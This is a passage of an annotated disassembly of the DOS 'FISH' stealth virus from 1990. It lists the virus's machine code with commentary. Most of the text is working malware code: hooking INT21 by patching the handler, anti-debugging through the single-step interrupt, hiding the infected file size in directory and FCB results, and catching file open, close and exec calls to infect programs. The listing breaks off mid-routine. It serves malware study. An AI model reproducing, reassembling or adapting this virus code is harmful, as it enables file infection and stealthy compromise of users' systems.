;  FISH virus
;  Disassembled December 1990 Thomas E Dell 

3411:0100 E9FB0D         JMP    0EFE

3411:0103 68F563
                         DB ' is a tiny COM program.',0DH,0AH,'$'

3411:0120 BA0201         MOV    DX,0102 
3411:0123 B409           MOV    AH,09 
3411:0125 CD21           INT    21 
3411:0127 CD20           INT    20
 
3411:0129 0000000000000000
3411:0131 E9CA0D         JMP    0EFE

;  The first few bytes of the program are saved here, which can
;  contain either the start of the COM, or the ExeHeader:

3411:0134 EB1E           JMP    $+1E
                         DB 'This is a tiny COM program',0

;------------------------------------------------------------------------

;  Call previous INT21 handler.

3411:0151 9C             PUSHF
3411:0152 2EFF1E350E     CALL FAR CS:[0E35]
3411:0157 C3             RET

;------------------------------------------------------------------------
                        DB      0,'COD'

;  COD1 -- Save all the registers on the stack

3411:015C 2E8F06EA0E     POP    CS:[0EEA]       ; Save return address
3411:0161 9C             PUSHF   
3411:0162 50             PUSH   AX 
3411:0163 53             PUSH   BX 
3411:0164 51             PUSH   CX 
3411:0165 52             PUSH   DX 
3411:0166 56             PUSH   SI 
3411:0167 57             PUSH   DI 
3411:0168 1E             PUSH   DS 
3411:0169 06             PUSH   ES 
3411:016A 2EFF26EA0E     JMP    CS:[0EEA]       ; Return to caller

;  COD2 -- Restore all registers

3411:016F 2E8F06EA0E     POP    CS:[0EEA]       ; Save return address
3411:0174 07             POP    ES 
3411:0175 1F             POP    DS 
3411:0176 5F             POP    DI 
3411:0177 5E             POP    SI 
3411:0178 5A             POP    DX 
3411:0179 59             POP    CX 
3411:017A 5B             POP    BX 
3411:017B 58             POP    AX 
3411:017C 9D             POPF    
3411:017D 2EFF26EA0E     JMP    CS:[0EEA]       ; Return to caller

;------------------------------------------------------------------------
                        DB      'SHARK'

;  SHARK1 -- restore all registers using internal stack

3411:0187 2E8926570F     MOV    CS:[0F57],SP            ; save SP
3411:018C 2E8C16590F     MOV    CS:[0F59],SS            ; save SS
3411:0191 0E             PUSH   CS 
3411:0192 17             POP    SS                      ; internal SS
3411:0193 2E8B265B0F     MOV    SP,CS:[0F5B]            ; internal SP
3411:0198 2EE8D3FF       CALL   016F                    ; COD2 - restore regs
3411:019C 2E8E16590F     MOV    SS,CS:[0F59]            ; restore SS
3411:01A1 2E89265B0F     MOV    CS:[0F5B],SP            ; internal SP
3411:01A6 2E8B26570F     MOV    SP,CS:[0F57]            ; restore SP
3411:01AB C3             RET
     
;  SHARK2 -- save all registers using internal stack

3411:01AC 2E8926570F     MOV    CS:[0F57],SP            ; save SP
3411:01B1 2E8C16590F     MOV    CS:[0F59],SS            ; save SS
3411:01B6 0E             PUSH   CS 
3411:01B7 17             POP    SS                      ; internal SS
3411:01B8 2E8B265B0F     MOV    SP,CS:[0F5B]            ; internal SP
3411:01BD 2EE89BFF       CALL   015C                    ; COD1 - save regs
3411:01C1 2E8E16590F     MOV    SS,CS:[0F59]            ; restore SS
3411:01C6 2E89265B0F     MOV    CS:[0F5B],SP            ; internal SP
3411:01CB 2E8B26570F     MOV    SP,CS:[0F57]            ; restore SP
3411:01D0 C3             RET     
3411:01D1 8C

;  SHARK3 - swap the JMP xxxx:yyy and the real INT21 code. This must
;  be setup before attempting to execute the previous INT21.

3411:01D2 BE4B0E         MOV    SI,0E4B
3411:01D5 2EC43E350E     LES    DI,CS:[0E35] 
3411:01DA 0E             PUSH   CS 
3411:01DB 1F             POP    DS 
3411:01DC FC             CLD     
3411:01DD B90500         MOV    CX,0005                 ; 5 bytes
3411:01E0 AC             LODSB   
3411:01E1 268605         XCHG   AL,ES:[DI] 
3411:01E4 8844FF         MOV    [SI-01],AL 
3411:01E7 47             INC    DI 
3411:01E8 E2F6           LOOP   01E0

;  Note: the "C" in CARP below is a RET..!

;------------------------------------------------------------------------
                        DB      'CARP'

;  CARP1 -- Intercept single step interrupt. Anyway this causes the
;  system to crash when attempting to follow FISH with DEBUG.

3411:01EF B001           MOV    AL,01           ; INT01, single step
3411:01F1 0E             PUSH   CS
3411:01F2 1F             POP    DS 
3411:01F3 BAB70C         MOV    DX,0CB7         ; INT01 routine, at 0D9B
3411:01F6 E80100         CALL   01FA            ; CARP2 - set interrupt
3411:01F9 C3             RET

;  CARP2 - Set an interrupt by manipulating the 0000:0000 table directly

3411:01FA 06             PUSH   ES 
3411:01FB 53             PUSH   BX 
3411:01FC 33DB           XOR    BX,BX 
3411:01FE 8EC3           MOV    ES,BX 
3411:0200 8AD8           MOV    BL,AL 
3411:0202 D1E3           SHL    BX,1 
3411:0204 D1E3           SHL    BX,1 
3411:0206 268917         MOV    ES:[BX],DX 
3411:0209 268C5F02       MOV    ES:[BX+02],DS 
3411:020D 5B             POP    BX 
3411:020E 07             POP    ES 
3411:020F C3             RET
     
;  CARP3 - Get an interrupt from the segment 0000:0000 table

3411:0210 1E             PUSH   DS 
3411:0211 56             PUSH   SI 
3411:0212 33F6           XOR    SI,SI 
3411:0214 8EDE           MOV    DS,SI 
3411:0216 32E4           XOR    AH,AH 
3411:0218 8BF0           MOV    SI,AX 
3411:021A D1E6           SHL    SI,1 
3411:021C D1E6           SHL    SI,1 
3411:021E 8B1C           MOV    BX,[SI] 
3411:0220 8E4402         MOV    ES,[SI+02] 
3411:0223 5E             POP    SI 
3411:0224 1F             POP    DS 
3411:0225 C3             RET

;------------------------------------------------------------------------
                        DB      'BASS'

;  BASS1 -- Continue the setup procedure.

3411:022A E8B002         CALL   04DD            ; SPOOF
3411:022D B9
3411:022E E8560A         CALL   0C87            ; TUNA2
3411:0231 8E
3411:0232 2EA3E30E       MOV    CS:[0EE3],AX
3411:0236 B452           MOV    AH,52           ; Get list of lists
3411:0238 2EC7065B0F0010 MOV    Word Ptr CS:[0F5B],1000 
3411:023F 2E8C1E450E     MOV    CS:[0E45],DS 
3411:0244 E8800B         CALL   0DC7            ; SPOOF
3411:0247 EB
3411:0248 CD21           INT    21
3411:024A 268B47FE       MOV    AX,ES:[BX-02]
3411:024E 2EA3470E       MOV    CS:[0E47],AX
3411:0252 0E             PUSH   CS 
3411:0253 1F             POP    DS 
3411:0254 E8300A         CALL   0C87            ; TUNA2
3411:0257 A1
3411:0258 B021           MOV    AL,21           ; 21, DOS interrupt
3411:025A E8B3FF         CALL   0210            ; CARP3 - get interrupt
3411:025D 8C062F0E       MOV    [0E2F],ES 
3411:0261 891E2D0E       MOV    [0E2D],BX

;  Disable single step interrupt

3411:0265 BAB70C         MOV    DX,0CB7         ; INT01 routine, at 0D9B
3411:0268 B001           MOV    AL,01 
3411:026A C606500E00     MOV    Byte Ptr [0E50],00 
3411:026F E888FF         CALL   01FA            ; CARP2 - set interrupt

3411:0272 9C             PUSHF   
3411:0273 58             POP    AX 
3411:0274 0D0001         OR AX,0100 
3411:0277 50             PUSH   AX 
3411:0278 9D             POPF    
3411:0279 9C             PUSHF   
3411:027A B461           MOV    AH,61
3411:027C FF1E2D0E       CALL   FAR [0E2D] 
3411:0280 9C             PUSHF   
3411:0281 58             POP    AX 
3411:0282 25FFFE         AND    AX,FEFF 
3411:0285 50             PUSH   AX 
3411:0286 9D             POPF    
3411:0287 E8E101         CALL   046B 
3411:028A A3

;  INT21 is never intercepted directly. Instead, the current
;  handler has a far jmp overwritten on top of it. The JMP written
;  points to the TROUT2 routine, our INT21 "tsr".

3411:028B C43E2D0E       LES    DI,[0E2D]
3411:028f 8C06370E       MOV    [0E37],ES
3411:0293 C6064B0EEA     MOV    Byte Ptr [0E4B],EA      ; jmp xxxx:yyyy
3411:0298 C7064C0E5B0D   MOV    Word Ptr [0E4C],0D5B    ; yyyy
3411:029E 893E350E       MOV    [0E35],DI 
3411:02A2 8C0E4E0E       MOV    [0E4E],CS               ; xxxx
3411:02A6 E80700         CALL   02B0 
3411:02A9 E826FF         CALL   01D2            ; SHARK3
3411:02AC E8170A         CALL   0CC6            ; SPOOF
3411:02AF 89
3411:02B0 B02F           MOV    AL,2F           ; int 2F, print spooler, why?
3411:02B2 E85BFF         CALL   0210            ; CARP3 - get interrupt
3411:02B5 8CC3           MOV    BX,ES
3411:02B8 2E391E470E     CMP    CS:[0E47],BX
3411:02BC 731C           JNB    02DA 
3411:02BE E83F0A         CALL   0D00 
3411:02C1 2E8E1E2F0E     MOV    DS,CS:[0E2F] 
3411:02C6 2EFF362D0E     PUSH   CS:[0E2D] 
3411:02CB 5A             POP    DX 
3411:02CC B013           MOV    AL,13           ; BIOS disk access, INT13
3411:02CE E829FF         CALL   01FA            ; CARP2 - set interrupt
3411:02D1 33DB           XOR    BX,BX 
3411:02D3 8EDB           MOV    DS,BX 
3411:02D5 C606750402     MOV    Byte Ptr [0475],02 
3411:02DA C3             RET

                DB      ' FISH VIRUS #6 - EACH DIFF - BONN 2/90 '

;  The following are intended to be printed. Version letters?

                DB      ''~knzyvo}''
                DB      '$'

3411:030D E8C2FE         CALL   01D2                    ; SHARK3
3411:0310 2E8C0E4E0E     MOV    CS:[0E4E],CS
3411:0315 E8BAFE         CALL   01D2                    ; SHARK3
3411:0318 0E             PUSH   CS 
3411:0319 1F             POP    DS 
3411:031A 1E             PUSH   DS 
3411:031B 07             POP    ES 
3411:031C A1450E         MOV    AX,[0E45] 
3411:031F 8EC0           MOV    ES,AX 
3411:0321 26C5160A00     LDS    DX,ES:[000A] 
3411:0326 8ED8           MOV    DS,AX 
3411:0328 051000         ADD    AX,0010 
3411:032B 2E01061A00     ADD    CS:[001A],AX 
3411:0330 2E803E200000   CMP    Byte Ptr CS:[0020],00   ; COM/EXE flag
3411:0336 FB             STI     
3411:0337 7524           JNZ    035D 
3411:0339 2EA10400       MOV    AX,CS:[0004] 
3411:033D A30001         MOV    [0100],AX 
3411:0340 2EA10600       MOV    AX,CS:[0006]
3411:0344 A30201         MOV    [0102],AX 
3411:0347 2EA10800       MOV    AX,CS:[0008] 
3411:034B A30401         MOV    [0104],AX 
3411:034E 2EFF36450E     PUSH   CS:[0E45] 
3411:0353 33C0           XOR    AX,AX 
3411:0355 FEC4           INC    AH 
3411:0357 50             PUSH   AX 
3411:0358 2EA1E30E       MOV    AX,CS:[0EE3] 
3411:035C CB             RETF
    
3411:035D 2E01061200     ADD    CS:[0012],AX 
3411:0362 2EA1E30E       MOV    AX,CS:[0EE3] 
3411:0366 2E8B261400     MOV    SP,CS:[0014] 
3411:036B 2E8E161200     MOV    SS,CS:[0012] 
3411:0370 2EFF2E1800     JMP    FAR CS:[0018]

;------------------------------------------------------------------------
                        DB      'TROUT'

;  TROUT1 -- JUMPSTART --

;  Startup and change code segment.
;  This routine is executed right after the virus has been decrypted.

3411:037A 33E4           XOR    SP,SP 
3411:037C E80000         CALL   037F 
3411:037F 89C5           MOV    BP,AX           ; Save AX
3411:0381 8CC8           MOV    AX,CS           ; AX = segment
3411:0383 BB1000         MOV    BX,0010 
3411:0386 F7E3           MUL    BX              ; AX = segment shifted left
3411:0388 59             POP    CX              ; CX = 037F
3411:0389 81E94F02       SUB    CX,024F         ; CX = 0130
3411:038D 03C1           ADD    AX,CX 
3411:038F 83D200         ADC    DX,+00 
3411:0392 F7F3           DIV    BX              ; AX = seg + xxxx
3411:0394 50             PUSH   AX 
3411:0395 B8FA00         MOV    AX,00FA 
3411:0398 50             PUSH   AX 
3411:0399 89E8           MOV    AX,BP           ; Restore AX
3411:039B CB             RETF                   ; To BASS1 routine
    
;  I N T 2 1

;  TROUT2 -- INT21 processing. Come here right after
;  decrypting memory if required.

3411:039C E8CC00         CALL   046B            ; SPOOF
3411:039F CD
3411:03A0 E8240A         CALL   0DC7            ; SPOOF
3411:03A3 CB
    
3411:03A4 53             PUSH   BX 
3411:03A5 8BDC           MOV    BX,SP 
3411:03A7 368B5F06       MOV    BX,SS:[BX+06] 
3411:03AB 2E891EB30E     MOV    CS:[0EB3],BX 
3411:03B0 5B             POP    BX
3411:03B1 55             PUSH   BP
3411:03B2 89E5           MOV    BP,SP 
3411:03B4 E8D008         CALL   0C87            ; TUNA2
3411:03B7 A3

;  Swap back "IN" the first five bytes of the proper INT21 handler.

3411:03B8 E8F1FD         CALL   01AC            ; SHARK2 - save regs internal
3411:03BB E814FE         CALL   01D2            ; SHARK3
3411:03BE E8C6FD         CALL   0187            ; SHARK1 - rest regs internal
3411:03C1 E898FD         CALL   015C            ; COD1 - save registers
3411:03C4 E8C008         CALL   0C87            ; TUNA2
3411:03C7 88

;  Check the INT21 function number. This uses diversionary
;  tactics (random bytes) to prevent disassembly.

3411:03C8 80FC0F         CMP    AH,0F           ; Open file with FCB
2FF2:03CB 7504           JNZ    03D1
2FF2:03CD E9E900         JMP    04B9
2FF2:03D0 B8
2FF2:03D1 80FC11         CMP    AH,11           ; First match FCB
2FF2:03D4 7504           JNZ    03DA
2FF2:03D6 E99B00         JMP    0474
2FF2:03D9 A1
2FF2:03DA 80FC12         CMP    AH,12           ; Next match FCB
2FF2:03DD 7504           JNZ    03E3
2FF2:03DF E99200         JMP    0474
2FF2:03E2 89
2FF2:03E3 80FC14         CMP    AH,14           ; Sequential read
2FF2:03E6 7504           JNZ    03EC
2FF2:03E8 E90901         JMP    04F4
2FF2:03EB EB
2FF2:03EC 80FC21         CMP    AH,21           ; Random read
2FF2:03EF 7504           JNZ    03F5
2FF2:03F1 E9F400         JMP    04E8
2FF2:03F4 8C
2FF2:03F5 80FC23         CMP    AH,23           ; Get file size
2FF2:03F8 7504           JNZ    03FE
2FF2:03FA E98401         JMP    0581
2FF2:03FD A3
2FF2:03FE 80FC27         CMP    AH,27           ; Random block read
2FF2:0401 7504           JNZ    0407
2FF2:0403 E9E000         JMP    04E6
2FF2:0406 EB
2FF2:0407 80FC3D         CMP    AH,3D           ; Open file
2FF2:040A 7504           JNZ    0410
2FF2:040C E9C601         JMP    05D5
2FF2:040F FF
2FF2:0410 80FC3E         CMP    AH,3E           ; Close file
2FF2:0413 7504           JNZ    0419
2FF2:0415 E90102         JMP    0619
2FF2:0418 A1
2FF2:0419 80FC3F         CMP    AH,3F           ; Read file or device
2FF2:041C 7504           JNZ    0422
2FF2:041E E97D07         JMP    0B9E
2FF2:0421 88
2FF2:0422 80FC42         CMP    AH,42           ; Move file pointer
2FF2:0425 7504           JNZ    042B
2FF2:0427 E94207         JMP    0B6C
2FF2:042A 8C
2FF2:042B 80FC4B         CMP    AH,4B           ; Launch
2FF2:042E 7504           JNZ    0434
2FF2:0430 E91C02         JMP    064F
2FF2:0433 EB
2FF2:0434 80FC4E         CMP    AH,4E           ; Search first match
2FF2:0437 7504           JNZ    043D
2FF2:0439 E95308         JMP    0C8F
2FF2:043C 89
2FF2:043D 80FC4F         CMP    AH,4F           ; Search next match
2FF2:0440 7504           JNZ    0446
2FF2:0442 E94A08         JMP    0C8F
2FF2:0445 8E
2FF2:0446 80FC57         CMP    AH,57           ; Get/set file date + time
2FF2:0449 7503           JNZ    044E
2FF2:044B E9CF06         JMP    0B1D

2FF2:044E E95709         JMP    0DA8
2FF2:0451 EB

;  Swap "OUT" the first five bytes of the original INT21 handler,
;  and install the FAR JMP to our INT21 TSR.

2FF2:0452 E87209         CALL   0DC7            ; SPOOF
3411:0455 A1
3411:0456 E853FD         CALL   01AC            ; SHARK2 - save regs internal
3411:0459 E876FD         CALL   01D2            ; SHARK3
3411:045C E828FD         CALL   0187            ; SHARK1 - rest regs internal
3411:045F 89E5           MOV    BP,SP 
3411:0461 2EFF36B30E     PUSH   CS:[0EB3] 
3411:0466 8F4606         POP    [BP+06] 
3411:0469 5D             POP    BP 
3411:046A CF             IRET    

3411:046B 2EFF06310E     INC    Word Ptr CS:[0E31] 
3411:0470 E91408         JMP    0C87            ; TUNA2
3411:0473 A1                                    ; filler, no reason

;  I N T 2 1 / AH = 11,12 -- First & Next match with FCB

3411:0474 E8F8FC         CALL   016F            ; COD2 - restore registers
3411:0477 E8D7FC         CALL   0151            ; Call previous INT21
3411:047A 0AC0           OR     AL,AL
3411:047C 75D4           JNZ    0452            ; No matches found
3411:047E E8DBFC         CALL   015C            ; COD1 - save registers
3411:0481 E8C101         CALL   0645            ; Get DTA address
3411:0484 B000           MOV    AL,00 
3411:0486 803FFF         CMP    Byte Ptr [BX],FF 
3411:0489 7506           JNZ    0491 
3411:048B 8A4706         MOV    AL,[BX+06] 
3411:048E 83C307         ADD    BX,+07 
3411:0491 2E2006F00E     AND    CS:[0EF0],AL

;  If from the FCB the file appears to be infected, subtract
;  the length of the virus, E00, from the reported length.

3411:0496 F6471A80       TEST   Byte Ptr [BX+1A],80 
3411:049A 7415           JZ 04B1 
3411:049C 806F1AC8       SUB    Byte Ptr [BX+1A],C8     ; 100 years
3411:04A0 2E803EF00E00   CMP    Byte Ptr CS:[0EF0],00 
3411:04A6 7509           JNZ    04B1 
3411:04A8 816F1D000E     SUB    Word Ptr [BX+1D],0E00   ; Length of virus
3411:04AD 835F1F00       SBB    Word Ptr [BX+1F],+00
 
3411:04B1 E8BBFC         CALL   016F            ; COD2 - restore registers
3411:04B4 EB9C           JMP    0452 

                DB      'FIN'

;  I N T 2 1 / AH = 0F -- Open with FCB

3411:04B9 E8B3FC         CALL   016F            ; COD2 - restore registers
3411:04BC E892FC         CALL   0151            ; Call INT21 to open file
3411:04BF E89AFC         CALL   015C            ; COD1 - save registers
3411:04C2 0AC0           OR     AL,AL
3411:04C4 75EB           JNZ    04B1            ; Unsuccessful

;  Diddle with the FCB to indicate "true" size of infected files

3411:04C6 89D3           MOV    BX,DX 
3411:04C8 F6471580       TEST   Byte Ptr [BX+15],80     ; Infected?
3411:04CC 74E3           JZ 04B1 
3411:04CE 806F15C8       SUB    Byte Ptr [BX+15],C8     ; 100 years
3411:04D2 816F10000E     SUB    Word Ptr [BX+10],0E00   ; Length of virus
3411:04D7 805F1200       SBB    Byte Ptr [BX+12],00 
3411:04DB EBD4           JMP    04B1
 
3411:04DD 2EFF0E310E     DEC    Word Ptr CS:[0E31] 
3411:04E2 E9A207         JMP    0C87            ; Spoof with TUNA2
3411:04E5 A3

;  I N T 2 1 / AH = 27 -- Random block read

3411:04E6 E31B           JCXZ   0503

;  I N T 2 1 / AH = 21 -- Random read

3411:04E8 89D3           MOV    BX,DX 
3411:04EA 8B7721         MOV    SI,[BX+21] 
3411:04ED 0B7723         OR SI,[BX+23] 
3411:04F0 7511           JNZ    0503 
3411:04F2 EB0A           JMP    04FE

;  I N T 2 1 / AH = 14 -- Sequential read

3411:04F4 89D3           MOV    BX,DX 
3411:04F6 8B470C         MOV    AX,[BX+0C] 
3411:04F9 0A4720         OR AL,[BX+20] 
3411:04FC 7505           JNZ    0503 
3411:04FE E8E304         CALL   09E4            ; PIKE2
3411:0501 7303           JNB    0506 
3411:0503 E948FF         JMP    044E 
3411:0506 E866FC         CALL   016F            ; COD2 - restore registers
3411:0509 E850FC         CALL   015C            ; COD1 - save registers
3411:050C E842FC         CALL   0151 
3411:050F 894EF8         MOV    [BP-08],CX 
3411:0512 8946FC         MOV    [BP-04],AX 
3411:0515 1E             PUSH   DS 
3411:0516 52             PUSH   DX 
3411:0517 E82B01         CALL   0645            ; Get DTA address
3411:051A 837F1401       CMP    Word Ptr [BX+14],+01 
3411:051E 741B           JZ     053B            ; MUSKY
3411:0520 8B07           MOV    AX,[BX] 
3411:0522 034702         ADD    AX,[BX+02] 
3411:0525 53             PUSH   BX 
3411:0526 8B5F04         MOV    BX,[BX+04] 
3411:0529 F7D3           NOT    BX 
3411:052B 01D8           ADD    AX,BX 
3411:052D 5B             POP    BX 
3411:052E 740B           JZ     053B            ; MUSKY
3411:0530 83C404         ADD    SP,+04 
3411:0533 E97BFF         JMP    04B1

;------------------------------------------------------------------------
                        DB      'MUSKY'

;  A musky is a large North American Pike that can
;  weigh as much as 80 pounds.

3411:053B 5A             POP    DX 
3411:053C 1F             POP    DS 
3411:053D 89D6           MOV    SI,DX 
3411:053F 0E             PUSH   CS 
3411:0540 07             POP    ES 
3411:0541 B92500         MOV    CX,0025 
3411:0544 BFB50E         MOV    DI,0EB5 
3411:0547 F3             REPZ   
3411:0548 A4             MOVSB   
3411:0549 BFB50E         MOV    DI,0EB5 
3411:054C 0E             PUSH   CS 
3411:054D 1F             POP    DS 
3411:054E 8B5512         MOV    DX,[DI+12] 
3411:0551 8B4510         MOV    AX,[DI+10] 
3411:0554 050F0E         ADD    AX,0E0F 
3411:0557 83D200         ADC    DX,+00 
3411:055A 25F0FF         AND    AX,FFF0 
3411:055D 895512         MOV    [DI+12],DX 
3411:0560 894510         MOV    [DI+10],AX 
3411:0563 2DFC0D         SUB    AX,0DFC 
3411:0566 83DA00         SBB    DX,+00 
3411:0569 895523         MOV    [DI+23],DX 
3411:056C 894521         MOV    [DI+21],AX 
3411:056F B91C00         MOV    CX,001C 
3411:0572 C7450E0100     MOV    Word Ptr [DI+0E],0001

3411:0577 B427           MOV    AH,27           ; Random block read
3411:0579 89FA           MOV    DX,DI 
3411:057B E8D3FB         CALL   0151 
3411:057E E930FF         JMP    04B1
 
;  I N T 2 1 / AH = 23 -- Get file size

3411:0581 0E             PUSH   CS 
3411:0582 07             POP    ES 
3411:0583 BFB50E         MOV    DI,0EB5 
3411:0586 B92500         MOV    CX,0025 
3411:0589 89D6           MOV    SI,DX 
3411:058B F3             REPZ   
3411:058C A4             MOVSB   
3411:058D 1E             PUSH   DS 
3411:058E 52             PUSH   DX 
3411:058F 0E             PUSH   CS 
3411:0590 1F             POP    DS 
3411:0591 B40F           MOV    AH,0F           ; open file with FCB
3411:0593 BAB50E         MOV    DX,0EB5 
3411:0596 E8B8FB         CALL   0151
3411:0599 B410           MOV    AH,10           ; close file with FCB
3411:059B E8B3FB         CALL   0151
3411:059E F606CA0E80     TEST   Byte Ptr [0ECA],80 
3411:05A3 5E             POP    SI 
3411:05A4 1F             POP    DS 
3411:05A5 742B           JZ 05D2 
3411:05A7 2EC41EC50E     LES    BX,CS:[0EC5] 
3411:05AC 8CC0           MOV    AX,ES 
3411:05AE 81EB000E       SUB    BX,0E00         ; Length of virus
3411:05B2 1D0000         SBB    AX,0000 
3411:05B5 33D2           XOR    DX,DX 
3411:05B7 2E8B0EC30E     MOV    CX,CS:[0EC3] 
3411:05BC 49             DEC    CX 
3411:05BD 01CB           ADD    BX,CX 
3411:05BF 150000         ADC    AX,0000 
3411:05C2 41             INC    CX 
3411:05C3 F7F1           DIV    CX 
3411:05C5 894423         MOV    [SI+23],AX 
3411:05C8 92             XCHG   AX,DX 
3411:05C9 93             XCHG   AX,BX 
3411:05CA F7F1           DIV    CX 
3411:05CC 894421         MOV    [SI+21],AX 
3411:05CF E9DFFE         JMP    04B1 
3411:05D2 E979FE         JMP    044E

;  I N T 2 1 / AH = 3D -- Open file

3411:05D5 E86C04         CALL   0A44            ; MACKEREL2
3411:05D8 E81504         CALL   09F0            ; PIKE3 -- process filename
3411:05DB 7239           JB 0616 
3411:05DD 2E803EA20E00   CMP    Byte Ptr CS:[0EA2],00 
3411:05E3 7431           JZ 0616 
3411:05E5 E86904         CALL   0A51            ; MACKEREL3
3411:05E8 83FBFF         CMP    BX,-01 
3411:05EB 7429           JZ 0616 
3411:05ED 2EFE0EA20E     DEC    Byte Ptr CS:[0EA2] 
3411:05F2 0E             PUSH   CS 
3411:05F3 07             POP    ES 
3411:05F4 B91400         MOV    CX,0014 
3411:05F7 BF520E         MOV    DI,0E52 
3411:05FA 33C0           XOR    AX,AX 
3411:05FC F2             REPNZ  
3411:05FD AF             SCASW   
3411:05FE 2EA1A30E       MOV    AX,CS:[0EA3] 
3411:0602 268945FE       MOV    ES:[DI-02],AX 
3411:0606 26895D26       MOV    ES:[DI+26],BX 
3411:060A 895EFC         MOV    [BP-04],BX 
3411:060D 2E8026B30EFE   AND    Byte Ptr CS:[0EB3],FE 
3411:0613 E99BFE         JMP    04B1 
3411:0616 E935FE         JMP    044E

;  I N T 2 1 / AH = 3E -- Close file or device

3411:0619 0E             PUSH   CS 
3411:061A 07             POP    ES 
3411:061B E82604         CALL   0A44            ; MACKEREL2
3411:061E B91400         MOV    CX,0014 
3411:0621 2EA1A30E       MOV    AX,CS:[0EA3] 
3411:0625 BF520E         MOV    DI,0E52 
3411:0628 F2             REPNZ  
3411:0629 AF             SCASW   
3411:062A 7516           JNZ    0642 
3411:062C 263B5D26       CMP    BX,ES:[DI+26] 
3411:0630 75F6           JNZ    0628 
3411:0632 26C745FE0000   MOV    Word Ptr ES:[DI-02],0000 
3411:0638 E81702         CALL   0852 
3411:063B 2EFE06A20E     INC    Byte Ptr CS:[0EA2] 
3411:0640 EBCB           JMP    060D 
3411:0642 E909FE         JMP    044E
 
;  Get DTA address

3411:0645 B42F           MOV    AH,2F           ; Get DTA
3411:0647 06             PUSH   ES 
3411:0648 E806FB         CALL   0151 
3411:064B 06             PUSH   ES 
3411:064C 1F             POP    DS 
3411:064D 07             POP    ES 
3411:064E C3             RET
     
;  I N T 2 1 / AH = 4B - LAUNCH

3411:064F 0AC0           OR     AL,AL
3411:0651 7403           JZ     0656            ; Load + execute
3411:0653 E95601         JMP    07AC            ; Just load -- SOLE2

;  INT21, Function 4B00, Load + Execute

3411:0656 1E             PUSH   DS 
3411:0657 52             PUSH   DX 
3411:0658 2E8C06260E     MOV    CS:[0E26],ES 
3411:065D 2E891E240E     MOV    CS:[0E24],BX 
3411:0662 2EC536240E     LDS    SI,CS:[0E24] 
3411:0667 B90E00         MOV    CX,000E 
3411:066A BFF10E         MOV    DI,0EF1 
3411:066D 0E             PUSH   CS 
3411:066E 07             POP    ES 
3411:066F F3             REPZ   
3411:0670 A4             MOVSB   
3411:0671 5E             POP    SI 
3411:0672 1F             POP    DS 
3411:0673 B95000         MOV    CX,0050 
3411:0676 BF070F         MOV    DI,0F07 
3411:0679 F3             REPZ   
3411:067A A4             MOVSB   
3411:067B BBFFFF         MOV    BX,FFFF 
3411:067E E8EEFA         CALL   016F            ; COD2 - restore registers
3411:0681 5D             POP    BP 
3411:0682 2E8F06E60E     POP    CS:[0EE6] 
3411:0687 2E8F06E80E     POP    CS:[0EE8] 
3411:068C 2E8F06B30E     POP    CS:[0EB3] 
3411:0691 0E             PUSH   CS 
3411:0692 B8014B         MOV    AX,4B01         ; Load but don't execute
3411:0695 07             POP    ES              ; Segment of parameter block
3411:0696 9C             PUSHF   
3411:0697 BBF10E         MOV    BX,0EF1         ; Offset of parameter block
3411:069A 2EFF1E350E     CALL   FAR CS:[0E35]   ; Previous INT21 handler
3411:069F 7320           JNB    06C1 
3411:06A1 2E830EB30E01   OR Word Ptr CS:[0EB3],+01 
3411:06A7 2EFF36B30E     PUSH   CS:[0EB3] 
3411:06AC 2EFF36E80E     PUSH   CS:[0EE8] 
3411:06B1 2EFF36E60E     PUSH   CS:[0EE6] 
3411:06B6 55             PUSH   BP 
3411:06B7 2EC41E240E     LES    BX,CS:[0E24] 
3411:06BC 89E5           MOV    BP,SP 
3411:06BE E991FD         JMP    0452 
3411:06C1 E88003         CALL   0A44            ; MACKEREL2
3411:06C4 0E             PUSH   CS 
3411:06C5 07             POP    ES 
3411:06C6 B91400         MOV    CX,0014 
3411:06C9 BF520E         MOV    DI,0E52 
3411:06CC 2EA1A30E       MOV    AX,CS:[0EA3] 
3411:06D0 F2             REPNZ  
3411:06D1 AF             SCASW   
3411:06D2 750D           JNZ    06E1 
3411:06D4 26C745FE0000   MOV    Word Ptr ES:[DI-02],0000 
3411:06DA 2EFE06A20E     INC    Byte Ptr CS:[0EA2] 
3411:06DF EBEB           JMP    06CC
3411:06E1 2EC536030F     LDS    SI,CS:[0F03]
3411:06E6 83FE01         CMP    SI,+01 
3411:06E9 7534           JNZ    071F 
3411:06EB 8B161A00       MOV    DX,[001A] 
3411:06EF 83C210         ADD    DX,+10 
3411:06F2 B451           MOV    AH,51           ; Get PSP segment
3411:06F4 E85AFA         CALL   0151 
3411:06F7 03D3           ADD    DX,BX 
3411:06F9 2E8916050F     MOV    CS:[0F05],DX 
3411:06FE FF361800       PUSH   [0018] 
3411:0702 2E8F06030F     POP    CS:[0F03] 
3411:0707 031E1200       ADD    BX,[0012] 
3411:070B 83C310         ADD    BX,+10 
3411:070E 2E891E010F     MOV    CS:[0F01],BX 
3411:0713 FF361400       PUSH   [0014] 
3411:0717 2E8F06FF0E     POP    CS:[0EFF] 
3411:071C E92800         JMP    0747
 
3411:071F 8B04           MOV    AX,[SI] 
3411:0721 034402         ADD    AX,[SI+02] 
3411:0724 53             PUSH   BX 
3411:0725 8B5C04         MOV    BX,[SI+04] 
3411:0728 F7D3           NOT    BX 
3411:072A 01D8           ADD    AX,BX 
3411:072C 5B             POP    BX 
3411:072D 7461           JZ     0790            ; SOLE1
3411:072F 0E             PUSH   CS 
3411:0730 1F             POP    DS 
3411:0731 BA070F         MOV    DX,0F07 
3411:0734 E8B902         CALL   09F0            ; PIKE3 - process filename
3411:0737 E81703         CALL   0A51            ; MACKEREL3
3411:073A 2EFE06EF0E     INC    Byte Ptr CS:[0EEF] 
3411:073F E81001         CALL   0852 
3411:0742 2EFE0EEF0E     DEC    Byte Ptr CS:[0EEF] 
3411:0747 B451           MOV    AH,51           ; Get PSP segment
3411:0749 E805FA         CALL   0151 
3411:074C E85DFA         CALL   01AC            ; SHARK2 - save regs internal
3411:074F E880FA         CALL   01D2            ; SHARK3
3411:0752 E832FA         CALL   0187            ; SHARK1 - rest regs internal
3411:0755 8EDB           MOV    DS,BX 
3411:0757 8EC3           MOV    ES,BX 
3411:0759 2EFF36B30E     PUSH   CS:[0EB3] 
3411:075E 2EFF36E80E     PUSH   CS:[0EE8] 
3411:0763 2EFF36E60E     PUSH   CS:[0EE6] 
3411:0768 8F060A00       POP    [000A] 
3411:076C 8F060C00       POP    [000C] 
3411:0770 1E             PUSH   DS 
3411:0771 B022           MOV    AL,22           ; DOS terminate
3411:0773 C5160A00       LDS    DX,[000A] 
